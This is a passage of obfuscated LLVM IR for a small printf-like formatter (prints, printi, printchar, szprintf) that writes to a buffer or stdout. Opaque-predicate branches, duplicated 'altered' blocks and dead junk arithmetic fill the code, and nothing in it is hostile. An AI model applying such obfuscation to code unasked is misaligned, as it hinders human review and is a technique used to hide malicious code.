  %_32 = sub i32 0, %565
  %gen33 = add i32 %_32, %564
  %_34 = sub i32 %565, %564
  %gen35 = mul i32 %_34, %564
  %_36 = sub i32 0, %565
  %gen37 = add i32 %_36, %564
  %566 = add nsw i32 %565, %564
  store i32 %566, i32* %17, align 4
  br label %originalBB26

originalBB41alteredBB:                            ; preds = %originalBB41, %318
  %567 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %314, i32 0, i32 3
  %568 = load i8*, i8** %567, align 8
  %569 = getelementptr i8, i8* %568, i32 %316
  %570 = bitcast i8* %569 to i32*
  %_42 = sub i32 0, %316
  %gen43 = add i32 %_42, 8
  %_44 = shl i32 %316, 8
  %_45 = sub i32 %316, 8
  %gen46 = mul i32 %_45, 8
  %_47 = sub i32 %316, 8
  %gen48 = mul i32 %_47, 8
  %571 = add i32 %316, 8
  store i32 %571, i32* %315, align 8
  br label %originalBB41

originalBB52alteredBB:                            ; preds = %originalBB52, %340
  %572 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %314, i32 0, i32 2
  %573 = load i8*, i8** %572, align 8
  %574 = bitcast i8* %573 to i32*
  %575 = getelementptr i8, i8* %573, i32 8
  store i8* %575, i8** %572, align 8
  br label %originalBB52

originalBB56alteredBB:                            ; preds = %originalBB56, %369
  %576 = load i8*, i8** %13, align 8
  %577 = load i8, i8* %576, align 1
  %578 = zext i8 %577 to i32
  %579 = icmp eq i32 %578, 117
  br label %originalBB56

originalBB60alteredBB:                            ; preds = %originalBB60, %407
  %580 = load i32, i32* %408, align 4
  %581 = load i32, i32* %15, align 4
  %582 = load i32, i32* %16, align 4
  %583 = call i32 @printi(i8** %391, i32 %580, i32 10, i32 0, i32 %581, i32 %582, i32 97)
  %584 = load i32, i32* %17, align 4
  %_61 = sub i32 0, %584
  %gen62 = add i32 %_61, %583
  %_63 = sub i32 %584, %583
  %gen64 = mul i32 %_63, %583
  %_65 = shl i32 %584, %583
  %_66 = sub i32 %584, %583
  %gen67 = mul i32 %_66, %583
  %_68 = sub i32 %584, %583
  %gen69 = mul i32 %_68, %583
  %585 = add nsw i32 %584, %583
  store i32 %585, i32* %17, align 4
  br label %originalBB60

originalBB73alteredBB:                            ; preds = %originalBB73, %441
  %586 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %437, i32 0, i32 3
  %587 = load i8*, i8** %586, align 8
  %588 = getelementptr i8, i8* %587, i32 %439
  %589 = bitcast i8* %588 to i32*
  %_74 = sub i32 %439, 8
  %gen75 = mul i32 %_74, 8
  %590 = add i32 %439, 8
  store i32 %590, i32* %438, align 8
  br label %originalBB73

originalBB79alteredBB:                            ; preds = %originalBB79, %497
  %591 = load i8**, i8*** %12, align 8
  %592 = load i8*, i8** %591, align 8
  store i8 0, i8* %592, align 1
  br label %originalBB79

originalBB83alteredBB:                            ; preds = %originalBB83, %516
  %593 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %594 = bitcast %struct.__va_list_tag* %593 to i8*
  call void @llvm.va_end(i8* %594)
  %595 = load i32, i32* %17, align 4
  br label %originalBB83
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %74

; <label>:15:                                     ; preds = %4
  %16 = load i32, i32* @x.31
  %17 = load i32, i32* @y.32
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %15
  store i32 0, i32* %11, align 4
  %24 = load i8*, i8** %6, align 8
  store i8* %24, i8** %12, align 8
  %25 = load i32, i32* @x.31
  %26 = load i32, i32* @y.32
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %33

; <label>:33:                                     ; preds = %56, %originalBBpart2
  %34 = load i8*, i8** %12, align 8
  %35 = load i8, i8* %34, align 1
  %36 = icmp ne i8 %35, 0
  br i1 %36, label %37, label %59

; <label>:37:                                     ; preds = %33
  %38 = load i32, i32* @x.31
  %39 = load i32, i32* @y.32
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %37
  %46 = load i32, i32* %11, align 4
  %47 = add nsw i32 %46, 1
  store i32 %47, i32* %11, align 4
  %48 = load i32, i32* @x.31
  %49 = load i32, i32* @y.32
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %56

; <label>:56:                                     ; preds = %originalBBpart24
  %57 = load i8*, i8** %12, align 8
  %58 = getelementptr inbounds i8, i8* %57, i32 1
  store i8* %58, i8** %12, align 8
  br label %33

; <label>:59:                                     ; preds = %33
  %60 = load i32, i32* %11, align 4
  %61 = load i32, i32* %7, align 4
  %62 = icmp sge i32 %60, %61
  br i1 %62, label %63, label %64

; <label>:63:                                     ; preds = %59
  store i32 0, i32* %7, align 4
  br label %68

; <label>:64:                                     ; preds = %59
  %65 = load i32, i32* %11, align 4
  %66 = load i32, i32* %7, align 4
  %67 = sub nsw i32 %66, %65
  store i32 %67, i32* %7, align 4
  br label %68

; <label>:68:                                     ; preds = %64, %63
  %69 = load i32, i32* %8, align 4
  %70 = and i32 %69, 2
  %71 = icmp ne i32 %70, 0
  br i1 %71, label %72, label %73

; <label>:72:                                     ; preds = %68
  store i32 48, i32* %10, align 4
  br label %73

; <label>:73:                                     ; preds = %72, %68
  br label %74

; <label>:74:                                     ; preds = %73, %4
  %75 = load i32, i32* %8, align 4
  %76 = and i32 %75, 1
  %77 = icmp ne i32 %76, 0
  br i1 %77, label %107, label %78

; <label>:78:                                     ; preds = %74
  br label %79

; <label>:79:                                     ; preds = %103, %78
  %80 = load i32, i32* %7, align 4
  %81 = icmp sgt i32 %80, 0
  br i1 %81, label %82, label %106

; <label>:82:                                     ; preds = %79
  %83 = load i32, i32* @x.31
  %84 = load i32, i32* @y.32
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %82
  %91 = load i8**, i8*** %5, align 8
  %92 = load i32, i32* %10, align 4
  call void @printchar(i8** %91, i32 %92)
  %93 = load i32, i32* %9, align 4
  %94 = add nsw i32 %93, 1
  store i32 %94, i32* %9, align 4
  %95 = load i32, i32* @x.31
  %96 = load i32, i32* @y.32
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBBpart214, label %originalBB6alteredBB

originalBBpart214:                                ; preds = %originalBB6
  br label %103

; <label>:103:                                    ; preds = %originalBBpart214
  %104 = load i32, i32* %7, align 4
  %105 = add nsw i32 %104, -1
  store i32 %105, i32* %7, align 4
  br label %79

; <label>:106:                                    ; preds = %79
  br label %107

; <label>:107:                                    ; preds = %106, %74
  br label %108

; <label>:108:                                    ; preds = %originalBBpart218, %107
  %109 = load i8*, i8** %6, align 8
  %110 = load i8, i8* %109, align 1
  %111 = icmp ne i8 %110, 0
  br i1 %111, label %112, label %138

; <label>:112:                                    ; preds = %108
  %113 = load i8**, i8*** %5, align 8
  %114 = load i8*, i8** %6, align 8
  %115 = load i8, i8* %114, align 1
  %116 = zext i8 %115 to i32
  call void @printchar(i8** %113, i32 %116)
  %117 = load i32, i32* %9, align 4
  %118 = add nsw i32 %117, 1
  store i32 %118, i32* %9, align 4
  br label %119

; <label>:119:                                    ; preds = %112
  %120 = load i32, i32* @x.31
  %121 = load i32, i32* @y.32
  %122 = sub i32 %120, 1
  %123 = mul i32 %120, %122
  %124 = urem i32 %123, 2
  %125 = icmp eq i32 %124, 0
  %126 = icmp slt i32 %121, 10
  %127 = or i1 %125, %126
  br i1 %127, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %119
  %128 = load i8*, i8** %6, align 8
  %129 = getelementptr inbounds i8, i8* %128, i32 1
  store i8* %129, i8** %6, align 8
  %130 = load i32, i32* @x.31
  %131 = load i32, i32* @y.32
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBBpart218, label %originalBB16alteredBB

originalBBpart218:                                ; preds = %originalBB16
  br label %108

; <label>:138:                                    ; preds = %108
  br label %139

; <label>:139:                                    ; preds = %179, %138
  %140 = load i32, i32* @x.31
  %141 = load i32, i32* @y.32
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %139
  %148 = load i32, i32* %7, align 4
  %149 = icmp sgt i32 %148, 0
  %150 = load i32, i32* @x.31
  %151 = load i32, i32* @y.32
  %152 = sub i32 %150, 1
  %153 = mul i32 %150, %152
  %154 = urem i32 %153, 2
  %155 = icmp eq i32 %154, 0
  %156 = icmp slt i32 %151, 10
  %157 = or i1 %155, %156
  br i1 %157, label %originalBBpart222, label %originalBB20alteredBB

originalBBpart222:                                ; preds = %originalBB20
  br i1 %149, label %158, label %182

; <label>:158:                                    ; preds = %originalBBpart222
  %159 = load i32, i32* @x.31
  %160 = load i32, i32* @y.32
  %161 = sub i32 %159, 1
  %162 = mul i32 %159, %161
  %163 = urem i32 %162, 2
  %164 = icmp eq i32 %163, 0
  %165 = icmp slt i32 %160, 10
  %166 = or i1 %164, %165
  br i1 %166, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %158
  %167 = load i8**, i8*** %5, align 8
  %168 = load i32, i32* %10, align 4
  call void @printchar(i8** %167, i32 %168)
  %169 = load i32, i32* %9, align 4
  %170 = add nsw i32 %169, 1
  store i32 %170, i32* %9, align 4
  %171 = load i32, i32* @x.31
  %172 = load i32, i32* @y.32
  %173 = sub i32 %171, 1
  %174 = mul i32 %171, %173
  %175 = urem i32 %174, 2
  %176 = icmp eq i32 %175, 0
  %177 = icmp slt i32 %172, 10
  %178 = or i1 %176, %177
  br i1 %178, label %originalBBpart240, label %originalBB24alteredBB

originalBBpart240:                                ; preds = %originalBB24
  br label %179

; <label>:179:                                    ; preds = %originalBBpart240
  %180 = load i32, i32* %7, align 4
  %181 = add nsw i32 %180, -1
  store i32 %181, i32* %7, align 4
  br label %139

; <label>:182:                                    ; preds = %originalBBpart222
  %183 = load i32, i32* %9, align 4
  ret i32 %183

originalBBalteredBB:                              ; preds = %originalBB, %15
  store i32 0, i32* %11, align 4
  %184 = load i8*, i8** %6, align 8
  store i8* %184, i8** %12, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %37
  %185 = load i32, i32* %11, align 4
  %_ = sub i32 0, %185
  %gen = add i32 %_, 1
  %186 = add nsw i32 %185, 1
  store i32 %186, i32* %11, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %82
  %187 = load i8**, i8*** %5, align 8
  %188 = load i32, i32* %10, align 4
  call void @printchar(i8** %187, i32 %188)
  %189 = load i32, i32* %9, align 4
  %_7 = shl i32 %189, 1
  %_8 = sub i32 0, %189
  %gen9 = add i32 %_8, 1
  %_10 = sub i32 %189, 1
  %gen11 = mul i32 %_10, 1
  %_12 = shl i32 %189, 1
  %190 = add nsw i32 %189, 1
  store i32 %190, i32* %9, align 4
  br label %originalBB6

originalBB16alteredBB:                            ; preds = %originalBB16, %119
  %191 = load i8*, i8** %6, align 8
  %192 = getelementptr inbounds i8, i8* %191, i32 1
  store i8* %192, i8** %6, align 8
  br label %originalBB16

originalBB20alteredBB:                            ; preds = %originalBB20, %139
  %193 = load i32, i32* %7, align 4
  %194 = icmp sgt i32 %193, 0
  br label %originalBB20

originalBB24alteredBB:                            ; preds = %originalBB24, %158
  %195 = load i8**, i8*** %5, align 8
  %196 = load i32, i32* %10, align 4
  call void @printchar(i8** %195, i32 %196)
  %197 = load i32, i32* %9, align 4
  %_25 = sub i32 0, %197
  %gen26 = add i32 %_25, 1
  %_27 = sub i32 %197, 1
  %gen28 = mul i32 %_27, 1
  %_29 = sub i32 %197, 1
  %gen30 = mul i32 %_29, 1
  %_31 = shl i32 %197, 1
  %_32 = sub i32 0, %197
  %gen33 = add i32 %_32, 1
  %_34 = sub i32 0, %197
  %gen35 = add i32 %_34, 1
  %_36 = sub i32 0, %197
  %gen37 = add i32 %_36, 1
  %_38 = shl i32 %197, 1
  %198 = add nsw i32 %197, 1
  store i32 %198, i32* %9, align 4
  br label %originalBB24
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %198

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %77

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* @x.33
  %38 = load i32, i32* @y.34
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %36
  %45 = load i32, i32* %11, align 4
  %46 = icmp eq i32 %45, 10
  %47 = load i32, i32* @x.33
  %48 = load i32, i32* @y.34
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %46, label %55, label %77

; <label>:55:                                     ; preds = %originalBBpart2
  %56 = load i32, i32* %10, align 4
  %57 = icmp slt i32 %56, 0
  br i1 %57, label %58, label %77

; <label>:58:                                     ; preds = %55
  %59 = load i32, i32* @x.33
  %60 = load i32, i32* @y.34
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %58
  store i32 1, i32* %19, align 4
  %67 = load i32, i32* %10, align 4
  %68 = sub nsw i32 0, %67
  store i32 %68, i32* %21, align 4
  %69 = load i32, i32* @x.33
  %70 = load i32, i32* @y.34
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBBpart211, label %originalBB1alteredBB

originalBBpart211:                                ; preds = %originalBB1
  br label %77

; <label>:77:                                     ; preds = %originalBBpart211, %55, %originalBBpart2, %33
  %78 = load i32, i32* @x.33
  %79 = load i32, i32* @y.34
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBB13, label %originalBB13alteredBB

originalBB13:                                     ; preds = %originalBB13alteredBB, %77
  %86 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %87 = getelementptr inbounds i8, i8* %86, i64 12
  %88 = getelementptr inbounds i8, i8* %87, i64 -1
  store i8* %88, i8** %17, align 8
  %89 = load i8*, i8** %17, align 8
  store i8 0, i8* %89, align 1
  %90 = load i32, i32* @x.33
  %91 = load i32, i32* @y.34
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBBpart215, label %originalBB13alteredBB

originalBBpart215:                                ; preds = %originalBB13
  br label %98

; <label>:98:                                     ; preds = %113, %originalBBpart215
  %99 = load i32, i32* %21, align 4
  %100 = icmp ne i32 %99, 0
  br i1 %100, label %101, label %122

; <label>:101:                                    ; preds = %98
  %102 = load i32, i32* %21, align 4
  %103 = load i32, i32* %11, align 4
  %104 = urem i32 %102, %103
  store i32 %104, i32* %18, align 4
  %105 = load i32, i32* %18, align 4
  %106 = icmp sge i32 %105, 10
  br i1 %106, label %107, label %113

; <label>:107:                                    ; preds = %101
  %108 = load i32, i32* %15, align 4
  %109 = sub nsw i32 %108, 48
  %110 = sub nsw i32 %109, 10
  %111 = load i32, i32* %18, align 4
  %112 = add nsw i32 %111, %110
  store i32 %112, i32* %18, align 4
  br label %113

; <label>:113:                                    ; preds = %107, %101
  %114 = load i32, i32* %18, align 4
  %115 = add nsw i32 %114, 48
  %116 = trunc i32 %115 to i8
  %117 = load i8*, i8** %17, align 8
  %118 = getelementptr inbounds i8, i8* %117, i32 -1
  store i8* %118, i8** %17, align 8
  store i8 %116, i8* %118, align 1
  %119 = load i32, i32* %11, align 4
  %120 = load i32, i32* %21, align 4
  %121 = udiv i32 %120, %119
  store i32 %121, i32* %21, align 4
  br label %98

; <label>:122:                                    ; preds = %98
  %123 = load i32, i32* @x.33
  %124 = load i32, i32* @y.34
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %122
  %131 = load i32, i32* %19, align 4
  %132 = icmp ne i32 %131, 0
  %133 = load i32, i32* @x.33
  %134 = load i32, i32* @y.34
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBBpart219, label %originalBB17alteredBB

originalBBpart219:                                ; preds = %originalBB17
  br i1 %132, label %141, label %190

; <label>:141:                                    ; preds = %originalBBpart219
  %142 = load i32, i32* %13, align 4
  %143 = icmp ne i32 %142, 0
  br i1 %143, label %144, label %154

; <label>:144:                                    ; preds = %141
  %145 = load i32, i32* %14, align 4
  %146 = and i32 %145, 2
  %147 = icmp ne i32 %146, 0
  br i1 %147, label %148, label %154

; <label>:148:                                    ; preds = %144
  %149 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %149, i32 45)
  %150 = load i32, i32* %20, align 4
  %151 = add nsw i32 %150, 1
  store i32 %151, i32* %20, align 4
  %152 = load i32, i32* %13, align 4
  %153 = add nsw i32 %152, -1
  store i32 %153, i32* %13, align 4
  br label %173

; <label>:154:                                    ; preds = %144, %141
  %155 = load i32, i32* @x.33
  %156 = load i32, i32* @y.34
  %157 = sub i32 %155, 1
  %158 = mul i32 %155, %157
  %159 = urem i32 %158, 2
  %160 = icmp eq i32 %159, 0
  %161 = icmp slt i32 %156, 10
  %162 = or i1 %160, %161
  br i1 %162, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %154
  %163 = load i8*, i8** %17, align 8
  %164 = getelementptr inbounds i8, i8* %163, i32 -1
  store i8* %164, i8** %17, align 8
  store i8 45, i8* %164, align 1
  %165 = load i32, i32* @x.33
  %166 = load i32, i32* @y.34
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br label %173

; <label>:173:                                    ; preds = %originalBBpart223, %148
  %174 = load i32, i32* @x.33
  %175 = load i32, i32* @y.34
  %176 = sub i32 %174, 1
  %177 = mul i32 %174, %176
  %178 = urem i32 %177, 2
  %179 = icmp eq i32 %178, 0
  %180 = icmp slt i32 %175, 10
  %181 = or i1 %179, %180
  br i1 %181, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %173
  %182 = load i32, i32* @x.33
  %183 = load i32, i32* @y.34
  %184 = sub i32 %182, 1
  %185 = mul i32 %182, %184
  %186 = urem i32 %185, 2
  %187 = icmp eq i32 %186, 0
  %188 = icmp slt i32 %183, 10
  %189 = or i1 %187, %188
  br i1 %189, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br label %190

; <label>:190:                                    ; preds = %originalBBpart227, %originalBBpart219
  %191 = load i32, i32* %20, align 4
  %192 = load i8**, i8*** %9, align 8
  %193 = load i8*, i8** %17, align 8
  %194 = load i32, i32* %13, align 4
  %195 = load i32, i32* %14, align 4
  %196 = call i32 @prints(i8** %192, i8* %193, i32 %194, i32 %195)
  %197 = add nsw i32 %191, %196
  store i32 %197, i32* %8, align 4
  br label %198

; <label>:198:                                    ; preds = %190, %25
  %199 = load i32, i32* %8, align 4
  ret i32 %199

originalBBalteredBB:                              ; preds = %originalBB, %36
  %200 = load i32, i32* %11, align 4
  %201 = icmp eq i32 %200, 10
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %58
  store i32 1, i32* %19, align 4
  %202 = load i32, i32* %10, align 4
  %_ = sub i32 0, 0
  %gen = add i32 %_, %202
  %_2 = sub i32 0, 0
  %gen3 = add i32 %_2, %202
  %_4 = sub i32 0, %202
  %gen5 = mul i32 %_4, %202
  %_6 = shl i32 0, %202
  %_7 = sub i32 0, 0
  %gen8 = add i32 %_7, %202
  %_9 = shl i32 0, %202
  %203 = sub nsw i32 0, %202
  store i32 %203, i32* %21, align 4
  br label %originalBB1

originalBB13alteredBB:                            ; preds = %originalBB13, %77
  %204 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %205 = getelementptr inbounds i8, i8* %204, i64 12
  %206 = getelementptr inbounds i8, i8* %205, i64 -1
  store i8* %206, i8** %17, align 8
  %207 = load i8*, i8** %17, align 8
  store i8 0, i8* %207, align 1
  br label %originalBB13

originalBB17alteredBB:                            ; preds = %originalBB17, %122
  %208 = load i32, i32* %19, align 4
  %209 = icmp ne i32 %208, 0
  br label %originalBB17

originalBB21alteredBB:                            ; preds = %originalBB21, %154
  %210 = load i8*, i8** %17, align 8
  %211 = getelementptr inbounds i8, i8* %210, i32 -1
  store i8* %211, i8** %17, align 8
  store i8 45, i8* %211, align 1
  br label %originalBB21

originalBB25alteredBB:                            ; preds = %originalBB25, %173
  br label %originalBB25
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %34

; <label>:15:                                     ; preds = %2
  %16 = load i32, i32* @x.35
  %17 = load i32, i32* @y.36
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %15
  %24 = bitcast i32* %4 to i8*
  %25 = call i64 @write(i32 1, i8* %24, i64 1)
  %26 = load i32, i32* @x.35
  %27 = load i32, i32* @y.36
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %34

; <label>:34:                                     ; preds = %originalBBpart2, %7
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %15
  %35 = bitcast i32* %4 to i8*
  %36 = call i64 @write(i32 1, i8* %35, i64 1)
  br label %originalBB
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #5

declare i64 @write(i32, i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = load i32, i32* @x.37
  %4 = load i32, i32* @y.38
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %11, align 8
  store i8* %1, i8** %12, align 8
  %14 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %13, i32 0, i32 0
  %15 = bitcast %struct.__va_list_tag* %14 to i8*
  call void @llvm.va_start(i8* %15)
  %16 = load i8*, i8** %12, align 8
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %13, i32 0, i32 0
  %18 = call i32 @print(i8** %11, i8* %16, %struct.__va_list_tag* %17)
  %19 = load i32, i32* @x.37
  %20 = load i32, i32* @y.38
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %18

originalBBalteredBB:                              ; preds = %originalBB, %2
  %27 = alloca i8*, align 8
  %28 = alloca i8*, align 8
  %29 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %27, align 8
  store i8* %1, i8** %28, align 8
  %30 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %29, i32 0, i32 0
  %31 = bitcast %struct.__va_list_tag* %30 to i8*
  call void @llvm.va_start(i8* %31)
